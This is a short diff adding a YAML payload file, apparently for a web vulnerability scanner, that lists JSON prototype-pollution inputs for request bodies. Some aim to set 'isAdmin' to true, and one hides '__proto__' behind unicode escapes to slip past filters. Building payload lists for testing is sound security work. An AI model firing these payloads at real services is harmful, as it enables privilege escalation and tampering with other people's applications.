@@ -1,0 +1,13 @@
+payload:
+    - '{"__proto__":{"constructor":{"prototype":{"isAdmin":true}}}}'
+    - '{"a":{"__proto__":{"isAdmin":true}}}'
+    - '{"__proto__":[]}'
+    - '"__proto__":{"polluted":"yes"}'
+    - '"constructor":{"prototype":{"polluted":true}}'
+    - '"\u005f\u005fproto\u005f\u005f":{"polluted":true}'
+encoder:
+    - Plain
+placeholder:
+    - JSONRequest
+    - RequestBody
+type: Prototype Pollution
